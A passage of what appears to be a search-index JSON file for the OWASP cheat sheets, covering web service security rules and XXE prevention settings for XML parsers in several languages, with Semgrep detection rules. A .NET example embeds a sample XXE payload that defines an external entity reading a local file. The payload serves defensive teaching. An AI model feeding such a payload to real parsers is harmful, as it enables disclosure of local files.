a strong white list. Validating against external entity attacks .","title":"Content Validation"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#output-encoding","text":"Web services need to ensure that the output sent to clients is encoded to be consumed as data and not as scripts. This gets pretty important when web service clients use the output to render HTML pages either directly or indirectly using AJAX objects. Rule : All the rules of output encoding applies as per Cross Site Scripting Prevention Cheat Sheet .","title":"Output Encoding"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#virus-protection","text":"SOAP provides the ability to attach files and documents to SOAP messages. This gives the opportunity for hackers to attach viruses and malware to these SOAP messages. Rule : Ensure Virus Scanning technology is installed and preferably inline so files and attachments could be checked before being saved on disk. Rule : Ensure Virus Scanning technology is regularly updated with the latest virus definitions/rules.","title":"Virus Protection"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#message-size","text":"Web services like web applications could be a target for DOS attacks by automatically sending the web services thousands of large size SOAP messages. This either cripples the application making it unable to respond to legitimate messages or it could take it down entirely. Rule : SOAP Messages size should be limited to an appropriate size limit. Larger size limit (or no limit at all) increases the chances of a successful DoS attack.","title":"Message Size"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#availability","text":"","title":"Availability"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#resources-limiting","text":"During regular operation, web services require computational power such as CPU cycles and memory. Due to malfunctioning or while under attack, a web service may required too much resources, leaving the host system unstable. Rule : Limit the amount of CPU cycles the web service can use based on expected service rate, in order to have a stable system. Rule : Limit the amount of memory the web service can use to avoid system running out of memory. In some cases the host system may start killing processes to free up memory. Rule : Limit the number of simultaneous open files, network connections and started processes.","title":"Resources Limiting"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#message-throughput","text":"Throughput represents the number of web service requests served during a specific amount of time. Rule : Configuration should be optimized for maximum message throughput to avoid running into DoS-like situations.","title":"Message Throughput"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#xml-denial-of-service-protection","text":"XML Denial of Service is probably the most serious attack against web services. So the web service must provide the following validation: Rule : Validation against recursive payloads. Rule : Validation against oversized payloads. Rule : Protection against XML entity expansion . Rule : Validating against overlong element names. If you are working with SOAP -based Web Services, the element names are those SOAP Actions. This protection should be provided by your XML parser/schema validator. To verify, build test cases to make sure your parser to resistant to these types of attacks.","title":"XML Denial of Service Protection"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#endpoint-security-profile","text":"Rule : Web services must be compliant with Web Services-Interoperability (WS-I) Basic Profile at minimum.","title":"Endpoint Security Profile"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html","text":"XML External Entity Prevention Cheat Sheet \u00b6 Introduction \u00b6 XML eXternal Entity injection (XXE), which is now part of the OWASP Top 10 via the point A4 , is a type of attack against an application that parses XML input. XXE issue is referenced under the ID 611 in the Common Weakness Enumeration referential. This attack occurs when untrusted XML input containing a reference to an external entity is processed by a weakly configured XML parser . This attack may lead to the disclosure of confidential data, denial of service, Server Side Request Forgery (SSRF), port scanning from the perspective of the machine where the parser is located, and other system impacts. The following guide provides concise information to prevent this vulnerability. For more information on XXE, please visit XML External Entity (XXE) . General Guidance \u00b6 The safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on the parser, the method should be similar to the following: factory . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); Disabling DTD s also makes the parser secure against denial of services (DOS) attacks such as Billion Laughs . If it is not possible to disable DTDs completely, then external entities and external document type declarations must be disabled in the way that's specific to each parser. Detailed XXE Prevention guidance for a number of languages and commonly used XML parsers in those languages is provided below. C/C++ \u00b6 libxml2 \u00b6 The Enum xmlParserOption should not have the following options defined: XML_PARSE_NOENT : Expands entities and substitutes them with replacement text XML_PARSE_DTDLOAD : Load the external DTD Note: Per: According to this post , starting with libxml2 version 2.9, XXE has been disabled by default as committed by the following patch . Search for the usage of the following APIs to ensure there is no XML_PARSE_NOENT and XML_PARSE_DTDLOAD defined in the parameters: xmlCtxtReadDoc xmlCtxtReadFd xmlCtxtReadFile xmlCtxtReadIO xmlCtxtReadMemory xmlCtxtUseOptions xmlParseInNodeContext xmlReadDoc xmlReadFd xmlReadFile xmlReadIO xmlReadMemory libxerces-c \u00b6 Use of XercesDOMParser do this to prevent XXE: XercesDOMParser * parser = new XercesDOMParser ; parser -> setCreateEntityReferenceNodes ( true ); parser -> setDisableDefaultEntityResolution ( true ); Use of SAXParser, do this to prevent XXE: SAXParser * parser = new SAXParser ; parser -> setDisableDefaultEntityResolution ( true ); Use of SAX2XMLReader, do this to prevent XXE: SAX2XMLReader * reader = XMLReaderFactory :: createXMLReader (); parser -> setFeature ( XMLUni :: fgXercesDisableDefaultEntityResolution , true ); Java \u00b6 Java applications using XML libraries are particularly vulnerable to XXE because the default settings for most Java XML parsers is to have XXE enabled. To use these parsers safely, you have to explicitly disable XXE in the parser you use. The following describes how to disable XXE in the most commonly used XML parsers for Java. JAXP DocumentBuilderFactory, SAXParserFactory and DOM4J \u00b6 DocumentBuilderFactory, SAXParserFactory and DOM4J XML Parsers can be configured using the same techniques to protect them against XXE. Only the DocumentBuilderFactory example is presented here. The JAXP DocumentBuilderFactory setFeature method allows a developer to control which implementation-specific XML processor features are enabled or disabled. The features can either be set on the factory or the underlying XMLReader setFeature method. Each XML processor implementation has its own features that govern how DTDs and external entities are processed. For a syntax highlighted example code snippet using SAXParserFactory , look here . import javax.xml.parsers.DocumentBuilderFactory ; import javax.xml.parsers.ParserConfigurationException ; // catching unsupported features ... DocumentBuilderFactory dbf = DocumentBuilderFactory . newInstance (); String FEATURE = null ; try { // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all // XML entity attacks are prevented // Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl FEATURE = \"http://apache.org/xml/features/disallow-doctype-decl\" ; dbf . setFeature ( FEATURE , true ); // If you can't completely disable DTDs, then at least do the following: // Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities // Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities // JDK7+ - http://xml.org/sax/features/external-general-entities //This feature has to be used together with the following one, otherwise it will not protect you from XXE for sure FEATURE = \"http://xml.org/sax/features/external-general-entities\" ; dbf . setFeature ( FEATURE , false ); // Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities // Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities // JDK7+ - http://xml.org/sax/features/external-parameter-entities //This feature has to be used together with the previous one, otherwise it will not protect you from XXE for sure FEATURE = \"http://xml.org/sax/features/external-parameter-entities\" ; dbf . setFeature ( FEATURE , false ); // Disable external DTDs as well FEATURE = \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" ; dbf . setFeature ( FEATURE , false ); // and these as well, per Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\" dbf . setXIncludeAware ( false ); dbf . setExpandEntityReferences ( false ); // And, per Timothy Morgan: \"If for some reason support for inline DOCTYPEs are a requirement, then // ensure the entity settings are disabled (as shown above) and beware that SSRF attacks // (http://cwe.mitre.org/data/definitions/918.html) and denial // of service attacks (such as billion laughs or decompression bombs via \"jar:\") are a risk.\" // remaining parser logic ... } catch ( ParserConfigurationException e ) { // This should catch a failed setFeature feature logger . info ( \"ParserConfigurationException was thrown. The feature '\" + FEATURE + \"' is probably not supported by your XML processor.\" ); ... } catch ( SAXException e ) { // On Apache, this should be thrown when disallowing DOCTYPE logger . warning ( \"A DOCTYPE was passed into the XML document\" ); ... } catch ( IOException e ) { // XXE that points to a file that doesn't exist logger . error ( \"IOException occurred, XXE may still possible: \" + e . getMessage ()); ... } // Load XML file or stream using a XXE agnostic configured parser... DocumentBuilder safebuilder = dbf . newDocumentBuilder (); Xerces 1 Features : Do not include external entities by setting this feature to false . Do not include parameter entities by setting this feature to false . Do not include external DTDs by setting this feature to false . Xerces 2 Features : Disallow an inline DTD by setting this feature to true . Do not include external entities by setting this feature to false . Do not include parameter entities by setting this feature to false . Do not include external DTDs by setting this feature to false . Note: The above defenses require Java 7 update 67, Java 8 update 20, or above, because the above countermeasures for DocumentBuilderFactory and SAXParserFactory are broken in earlier Java versions, per: CVE-2014-6517 . XMLInputFactory (a StAX parser) \u00b6 StAX parsers such as XMLInputFactory allow various properties and features to be set. To protect a Java XMLInputFactory from XXE, do this: // This disables DTDs entirely for that factory xmlInputFactory . setProperty ( XMLInputFactory . SUPPORT_DTD , false ); // disable external entities xmlInputFactory . setProperty ( \"javax.xml.stream.isSupportingExternalEntities\" , false ); Oracle DOM Parser \u00b6 Follow Oracle reomendation e.g.: // Extend oracle.xml.parser.v2.XMLParser DOMParser domParser = new DOMParser (); // Do not expand entity references domParser . setAttribute ( DOMParser . EXPAND_ENTITYREF , false ); // dtdObj is an instance of oracle.xml.parser.v2.DTD domParser . setAttribute ( DOMParser . DTD_OBJECT , dtdObj ); // Do not allow more than 11 levels of entity expansion domParser . setAttribute ( DOMParser . ENTITY_EXPANSION_DEPTH , 12 ); TransformerFactory \u00b6 To protect a javax.xml.transform.TransformerFactory from XXE, do this: TransformerFactory tf = TransformerFactory . newInstance (); tf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); tf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_STYLESHEET , \"\" ); Validator \u00b6 To protect a javax.xml.validation.Validator from XXE, do this: SchemaFactory factory = SchemaFactory . newInstance ( \"http://www.w3.org/2001/XMLSchema\" ); Schema schema = factory . newSchema (); Validator validator = schema . newValidator (); validator . setProperty ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); validator . setProperty ( XMLConstants . ACCESS_EXTERNAL_SCHEMA , \"\" ); SchemaFactory \u00b6 To protect a javax.xml.validation.SchemaFactory from XXE, do this: SchemaFactory factory = SchemaFactory . newInstance ( \"http://www.w3.org/2001/XMLSchema\" ); factory . setProperty ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); factory . setProperty ( XMLConstants . ACCESS_EXTERNAL_SCHEMA , \"\" ); Schema schema = factory . newSchema ( Source ); SAXTransformerFactory \u00b6 To protect a javax.xml.transform.sax.SAXTransformerFactory from XXE, do this: SAXTransformerFactory sf = SAXTransformerFactory . newInstance (); sf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); sf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_STYLESHEET , \"\" ); sf . newXMLFilter ( Source ); Note: Use of the following XMLConstants requires JAXP 1.5, which was added to Java in 7u40 and Java 8: javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET XMLReader \u00b6 To protect a Java org.xml.sax.XMLReader from XXE, do this: XMLReader reader = XMLReaderFactory . createXMLReader (); reader . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); // This may not be strictly required as DTDs shouldn't be allowed at all, per previous line. reader . setFeature ( \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" , false ); reader . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); reader . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); SAXReader \u00b6 To protect a Java org.dom4j.io.SAXReader from XXE, do this: saxReader . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); saxReader . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); saxReader . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); Based on testing, if you are missing one of these, you can still be vulnerable to an XXE attack. SAXBuilder \u00b6 To protect a Java org.jdom2.input.SAXBuilder from XXE, do this: SAXBuilder builder = new SAXBuilder (); builder . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); builder . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); builder . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); Document doc = builder . build ( new File ( fileName )); No-op EntityResolver \u00b6 For APIs that take an EntityResolver , you can neutralize an XML parser's ability to resolve entities by supplying a no-op implementation : public final class NoOpEntityResolver implements EntityResolver { public InputSource resolveEntity ( String publicId , String systemId ) { return new InputSource ( new StringReader ( \"\" )); } } // ... xmlReader . setEntityResolver ( new NoOpEntityResolver ()); documentBuilder . setEntityResolver ( new NoOpEntityResolver ()); or more simply: EntityResolver noop = ( publicId , systemId ) -> new InputSource ( new StringReader ( \"\" )); xmlReader . setEntityResolver ( noop ); documentBuilder . setEntityResolver ( noop ); JAXB Unmarshaller \u00b6 Since a javax.xml.bind.Unmarshaller parses XML and does not support any flags for disabling XXE, it's imperative to parse the untrusted XML through a configurable secure parser first, generate a source object as a result, and pass the source object to the Unmarshaller. For example: //Disable XXE SAXParserFactory spf = SAXParserFactory . newInstance (); spf . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); spf . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); spf . setFeature ( \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" , false ); //Do unmarshall operation Source xmlSource = new SAXSource ( spf . newSAXParser (). getXMLReader (), new InputSource ( new StringReader ( xml ))); JAXBContext jc = JAXBContext . newInstance ( Object . class ); Unmarshaller um = jc . createUnmarshaller (); um . unmarshal ( xmlSource ); XPathExpression \u00b6 A javax.xml.xpath.XPathExpression can not be configured securely by itself, so the untrusted data must be parsed through another securable XML parser first. For example: DocumentBuilderFactory df = DocumentBuilderFactory . newInstance (); df . setAttribute ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); df . setAttribute ( XMLConstants . ACCESS_EXTERNAL_SCHEMA , \"\" ); DocumentBuilder builder = df . newDocumentBuilder (); String result = new XPathExpression (). evaluate ( builder . parse ( new ByteArrayInputStream ( xml . getBytes ())) ); java.beans.XMLDecoder \u00b6 The readObject() method in this class is fundamentally unsafe. Not only is the XML it parses subject to XXE, but the method can be used to construct any Java object, and execute arbitrary code as described here . And there is no way to make use of this class safe except to trust or properly validate the input being passed into it. As such, we'd strongly recommend completely avoiding the use of this class and replacing it with a safe or properly configured XML parser as described elsewhere in this cheat sheet. Other XML Parsers \u00b6 There are many third-party libraries that parse XML either directly or through their use of other libraries. Please test and verify their XML parser is secure against XXE by default. If the parser is not secure by default, look for flags supported by the parser to disable all possible external resource inclusions like the examples given above. If there's no control exposed to the outside, make sure the untrusted content is passed through a secure parser first and then passed to insecure third-party parser similar to how the Unmarshaller is secured. Spring Framework MVC/OXM XXE Vulnerabilities \u00b6 For example, some XXE vulnerabilities were found in Spring OXM and Spring MVC . The following versions of the Spring Framework are vulnerable to XXE: 3.0.0 to 3.2.3 (Spring OXM & Spring MVC) 4.0.0.M1 (Spring OXM) 4.0.0.M1-4.0.0.M2 (Spring MVC) There were other issues as well that were fixed later, so to fully address these issues, Spring recommends you upgrade to Spring Framework 3.2.8+ or 4.0.2+. For Spring OXM, this is referring to the use of org.springframework.oxm.jaxb.Jaxb2Marshaller. Note that the CVE for Spring OXM specifically indicates that 2 XML parsing situations are up to the developer to get right, and 2 are the responsibility of Spring and were fixed to address this CVE. Here's what they say: Two situations developers must handle: For a DOMSource , the XML has already been parsed by user code and that code is responsible for protecting against XXE. For a StAXSource , the XMLStreamReader has already been created by user code and that code is responsible for protecting against XXE. The issue Spring fixed: For SAXSource and StreamSource instances, Spring processed external entities by default thereby creating this vulnerability. Here's an example of using a StreamSource that was vulnerable, but is now safe, if you are using a fixed version of Spring OXM or Spring MVC: import org.springframework.oxm.Jaxb2Marshaller ; import org.springframework.oxm.jaxb.Jaxb2Marshaller ; Jaxb2Marshaller marshaller = new Jaxb2Marshaller (); // Must cast return Object to whatever type you are unmarshalling marshaller . unmarshal ( new StreamSource ( new StringReader ( some_string_containing_XML )); So, per the Spring OXM CVE writeup , the above is now safe. But if you were to use a DOMSource or StAXSource instead, it would be up to you to configure those sources to be safe from XXE. Castor \u00b6 Castor is a data binding framework for Java. It allows conversion between Java objects, XML, and relational tables. The XML features in Castor prior to version 1.3.3 are vulnerable to XXE, and should be upgraded to the latest version. For additional information, check the official XML configuration file .NET \u00b6 The following information for XXE injection in .NET is directly from this web application of unit tests by Dean Fleming . This web application covers all currently supported .NET XML parsers, and has test cases for each demonstrating when they are safe from XXE injection and when they are not. Previously, this information was based on James Jardine's excellent .NET XXE article . It originally provided more recent and more detailed information than the older article from Microsoft on how to prevent XXE and XML Denial of Service in .NET , however, it has some inaccuracies that the web application covers. The following table lists all supported .NET XML parsers and their default safety levels: XML Parser Safe by default? LINQ to XML Yes XmlDictionaryReader Yes XmlDocument ...prior to 4.5.2 No ...in versions 4.5.2+ Yes XmlNodeReader Yes XmlReader Yes XmlTextReader ...prior to 4.5.2 No ...in versions 4.5.2+ Yes XPathNavigator ...prior to 4.5.2 No ...in versions 4.5.2+ Yes XslCompiledTransform Yes LINQ to XML \u00b6 Both the XElement and XDocument objects in the System.Xml.Linq library are safe from XXE injection by default. XElement parses only the elements within the XML file, so DTDs are ignored altogether. XDocument has DTDs disabled by default , and is only unsafe if constructed with a different unsafe XML parser. XmlDictionaryReader \u00b6 System.Xml.XmlDictionaryReader is safe by default, as when it attempts to parse the DTD, the compiler throws an exception saying that \"CData elements not valid at top level of an XML document\". It becomes unsafe if constructed with a different unsafe XML parser. XmlDocument \u00b6 Prior to .NET Framework version 4.5.2, System.Xml.XmlDocument is unsafe by default. The XmlDocument object has an XmlResolver object within it that needs to be set to null in versions prior to 4.5.2. In versions 4.5.2 and up, this XmlResolver is set to null by default. The following example shows how it is made safe: static void LoadXML () { string xxePayload = \"<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/Users/testdata2.txt'>]>\" + \"<doc>&win;</doc>\" ; string xml = \"<?xml version='1.0' ?>\" + xxePayload ; XmlDocument xmlDoc = new XmlDocument (); // Setting this to NULL disables DTDs - Its NOT null by default. xmlDoc . XmlResolver = null ; xmlDoc . LoadXml ( xml ); Console . WriteLine ( xmlDoc . InnerText ); Console . ReadLine (); } XmlDocument can become unsafe if you create your own nonnull XmlResolver with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the referenced MSDN article . XmlNodeReader \u00b6 System.Xml.XmlNodeReader objects are safe by default and will ignore DTDs even when constructed with an unsafe parser or wrapped in another unsafe parser. XmlReader \u00b6 System.Xml.XmlReader objects are safe by default. They are set by default to have their ProhibitDtd property set to false in .NET Framework versions 4.0 and earlier, or their DtdProcessing property set to Prohibit in .NET versions 4.0 and later. Additionally, in .NET versions 4.5.2 and later, the XmlReaderSettings belonging to the XmlReader has its XmlResolver set to null by default, which provides an additional layer of safety. Therefore, XmlReader objects will only become unsafe in version 4.5.2 and up if both the DtdProcessing property is set to Parse and the XmlReaderSetting 's XmlResolver is set to a nonnull XmlResolver with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the referenced MSDN article . XmlTextReader \u00b6 System.Xml.XmlTextReader is unsafe by default in .NET Framework versions prior to 4.5.2. Here is how to make it safe in various .NET versions: Prior to .NET 4.0 \u00b6 In .NET Framework versions prior to 4.0, DTD parsing behavior for XmlReader objects like XmlTextReader are controlled by the Boolean ProhibitDtd property found in the System.Xml.XmlReaderSettings and System.Xml.XmlTextReader classes. Set these values to true to disable inline DTDs completely. XmlTextReader reader = new XmlTextReader ( stream ); // NEEDED because the default is FALSE!! reader . ProhibitDtd = true ; .NET 4.0 - .NET 4.5.2 \u00b6 In .NET Framework version 4.0, DTD parsing behavior has been changed. The ProhibitDtd property has been deprecated in favor of the new DtdProcessing property. However, they didn't change the default settings so XmlTextReader is still vulnerable to XXE by default. Setting DtdProcessing to Prohibit causes the runtime to throw an exception if a <!DOCTYPE> element is present in the XML. To set this value yourself, it looks like this: XmlTextReader reader = new XmlTextReader ( stream ); // NEEDED because the default is Parse!! reader . DtdProcessing = DtdProcessing . Prohibit ; Alternatively, you can set the DtdProcessing property to Ignore , which will not throw an exception on encountering a <!DOCTYPE> element but will simply skip over it and not process it. Finally, you can set DtdProcessing to Parse if you do want to allow and process inline DTDs. .NET 4.5.2 and later \u00b6 In .NET Framework versions 4.5.2 and up, XmlTextReader 's internal XmlResolver is set to null by default, making the XmlTextReader ignore DTDs by default. The XmlTextReader can become unsafe if if you create your own nonnull XmlResolver with default or unsafe settings. XPathNavigator \u00b6 System.Xml.XPath.XPathNavigator is unsafe by default in .NET Framework versions prior to 4.5.2. This is due to the fact that it implements IXPathNavigable objects like XmlDocument , which are also unsafe by default in versions prior to 4.5.2. You can make XPathNavigator safe by giving it a safe parser like XmlReader (which is safe by default) in the XPathDocument 's constructor. Here is an example: XmlReader reader = XmlReader . Create ( \"example.xml\" ); XPathDocument doc = new XPathDocument ( reader ); XPathNavigator nav = doc . CreateNavigator (); string xml = nav . InnerXml . ToString (); XslCompiledTransform \u00b6 System.Xml.Xsl.XslCompiledTransform (an XML transformer) is safe by default as long as the parser it's given is safe. It is safe by default because the default parser of the Transform() methods is an XmlReader , which is safe by default (per above). The source code for this method is here. Some of the Transform() methods accept an XmlReader or IXPathNavigable (e.g., XmlDocument ) as an input, and if you pass in an unsafe XML Parser then the Transform will also be unsafe. iOS \u00b6 libxml2 \u00b6 iOS includes the C/C++ libxml2 library described above, so that guidance applies if you are using libxml2 directly. However, the version of libxml2 provided up through iOS6 is prior to version 2.9 of libxml2 (which protects against XXE by default). NSXMLDocument \u00b6 iOS also provides an NSXMLDocument type, which is built on top of libxml2. However, NSXMLDocument provides some additional protections against XXE that aren't available in libxml2 directly. Per the 'NSXMLDocument External Entity Restriction API' section of this page : iOS4 and earlier: All external entities are loaded by default. iOS5 and later: Only entities that don't require network access are loaded. (which is safer) However, to completely disable XXE in an NSXMLDocument in any version of iOS you simply specify NSXMLNodeLoadExternalEntitiesNever when creating the NSXMLDocument . PHP \u00b6 Per the PHP documentation , the following should be set when using the default PHP XML parser in order to prevent XXE: libxml_disable_entity_loader(true); A description of how to abuse this in PHP is presented in a good SensePost article describing a cool PHP based XXE vulnerability that was fixed in Facebook. Python \u00b6 The Python 3 official documentation contains a section on xml vulnerabilities . As of the 1st January 2020 Python 2 is no longer supported, however the Python website still contains some legacy documentation . The following table gives an overview of various modules in Python 3 used for XML parsing and whether or not they are vulnerable. Attack Type sax etree minidom pulldom xmlrpc Billion Laughs Vulnerable Vulnerable Vulnerable Vulnerable Vulnerable Quadratic Blowup Vulnerable Vulnerable Vulnerable Vulnerable Vulnerable External Entity Expansion Safe Safe Safe Safe Safe DTD Retrieval Safe Safe Safe Safe Safe Decompression Bomb Safe Safe Safe Safe Vulnerable To protect your application from the applicable attacks, two packages exist to help you sanitize your input and protect your application against DDoS and remote attacks. Semgrep Rules \u00b6 Semgrep is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase. Java \u00b6 Below are the rules for different XML parsers in Java Digester \u00b6 Identifying XXE vulnerability in the org.apache.commons.digester3.Digester library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-Digester DocumentBuilderFactory \u00b6 Identifying XXE vulnerability in the javax.xml.parsers.DocumentBuilderFactory library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-dbf SAXBuilder \u00b6 Identifying XXE vulnerability in the org.jdom2.input.SAXBuilder library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-saxbuilder SAXParserFactory \u00b6 Identifying XXE vulnerability in the javax.xml.parsers.SAXParserFactory library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-SAXParserFactory SAXReader \u00b6 Identifying XXE vulnerability in the org.dom4j.io.SAXReader library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-SAXReader XMLInputFactory \u00b6 Identifying XXE vulnerability in the javax.xml.stream.XMLInputFactory library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-XMLInputFactory XMLReader \u00b6 Identifying XXE vulnerability in the org.xml.sax.XMLReader library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-XMLReader References \u00b6 XXE by InfoSecInstitute OWASP Top 10-2017 A4: XML External Entities (XXE) Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\" FindSecBugs XXE Detection XXEbugFind Tool Testing for XML Injection","title":"XML External Entity Prevention"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xml-external-entity-prevention-cheat-sheet","text":"","title":"XML External Entity Prevention Cheat Sheet"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#introduction","text":"XML eXternal Entity injection (XXE), which is now part of the OWASP Top 10 via the point A4 , is a type of attack against an application that parses XML input. XXE issue is referenced under the ID 611 in the Common Weakness Enumeration referential. This attack occurs when untrusted XML input containing a reference to an external entity is processed by a weakly configured XML parser . This attack may lead to the disclosure of confidential data, denial of service, Server Side Request Forgery (SSRF), port scanning from the perspective of the machine where the parser is located, and other system impacts. The following guide provides concise information to prevent this vulnerability. For more information on XXE, please visit XML External Entity (XXE) .","title":"Introduction"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#general-guidance","text":"The safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on the parser, the method should be similar to the following: factory . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); Disabling DTD s also makes the parser secure against denial of services (DOS) attacks such as Billion Laughs . If it is not possible to disable DTDs completely, then external entities and external document type declarations must be disabled in the way that's specific to each parser. Detailed XXE Prevention guidance for a number of languages and commonly used XML parsers in those languages is provided below.","title":"General Guidance"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#cc","text":"","title":"C/C++"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#libxml2","text":"The Enum xmlParserOption should not have the following options defined: XML_PARSE_NOENT : Expands entities and substitutes them with replacement text XML_PARSE_DTDLOAD : Load the external DTD Note: Per: According to this post , starting with libxml2 version 2.9, XXE has been disabled by default as committed by the following patch . Search for the usage of the following APIs to ensure there is no XML_PARSE_NOENT and XML_PARSE_DTDLOAD defined in the parameters: xmlCtxtReadDoc xmlCtxtReadFd xmlCtxtReadFile xmlCtxtReadIO xmlCtxtReadMemory xmlCtxtUseOptions xmlParseInNodeContext xmlReadDoc xmlReadFd xmlReadFile xmlReadIO xmlReadMemory","title":"libxml2"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#libxerces-c","text":"Use of XercesDOMParser do this to prevent XXE: XercesDOMParser * parser = new XercesDOMParser ; parser -> setCreateEntityReferenceNodes ( true ); parser -> setDisableDefaultEntityResolution ( true ); Use of SAXParser, do this to prevent XXE: SAXParser * parser = new SAXParser ; parser -> setDisableDefaultEntityResolution ( true ); Use of SAX2XMLReader, do this to prevent XXE: SAX2XMLReader * reader = XMLReaderFactory :: createXMLReader (); parser -> setFeature ( XMLUni :: fgXercesDisableDefaultEntityResolution , true );","title":"libxerces-c"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java","text":"Java applications using XML libraries are particularly vulnerable to XXE because the default settings for most Java XML parsers is to have XXE enabled. To use these parsers safely, you have to explicitly disable XXE in the parser you use. The following describes how to disable XXE in the most commonly used XML parsers for Java.","title":"Java"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j","text":"DocumentBuilderFactory, SAXParserFactory and DOM4J XML Parsers can be configured using the same techniques to protect them against XXE. Only the DocumentBuilderFactory example is presented here. The JAXP DocumentBuilderFactory setFeature method allows a developer to control which implementation-specific XML processor features are enabled or disabled. The features can either be set on the factory or the underlying XMLReader setFeature method. Each XML processor implementation has its own features that govern how DTDs and external entities are processed. For a syntax highlighted example code snippet using SAXParserFactory , look here . import javax.xml.parsers.DocumentBuilderFactory ; import javax.xml.parsers.ParserConfigurationException ; // catching unsupported features ... DocumentBuilderFactory dbf = DocumentBuilderFactory . newInstance (); String FEATURE = null ; try { // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all // XML entity attacks are prevented // Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl FEATURE = \"http://apache.org/xml/features/disallow-doctype-decl\" ; dbf . setFeature ( FEATURE , true ); // If you can't completely disable DTDs, then at least do the following: // Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities // Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities // JDK7+ - http://xml.org/sax/features/external-general-entities //This feature has to be used together with the following one, otherwise it will not protect you from XXE for sure FEATURE = \"http://xml.org/sax/features/external-general-entities\" ; dbf . setFeature ( FEATURE , false ); // Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities // Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities // JDK7+ - http://xml.org/sax/features/external-parameter-entities //This feature has to be used together with the previous one, otherwise it will not protect you from XXE for sure FEATURE = \"http://xml.org/sax/features/external-parameter-entities\" ; dbf . setFeature ( FEATURE , false ); // Disable external DTDs as well FEATURE = \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" ; dbf . setFeature ( FEATURE , false ); // and these as well, per Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\" dbf . setXIncludeAware ( false ); dbf . setExpandEntityReferences ( false ); // And, per Timothy Morgan: \"If for some reason support for inline DOCTYPEs are a requirement, then // ensure the entity settings are disabled (as shown above) and beware that SSRF attacks // (http://cwe.mitre.org/data/definitions/918.html) and denial // of service attacks (such as billion laughs or decompression bombs via \"jar:\") are a risk.\" // remaining parser logic ... } catch ( ParserConfigurationException e ) { // This should catch a failed setFeature feature logger . info ( \"ParserConfigurationException was thrown. The feature '\" + FEATURE + \"' is probably not supported by your XML processor.\" ); ... } catch ( SAXException e ) { // On Apache, this should be thrown when 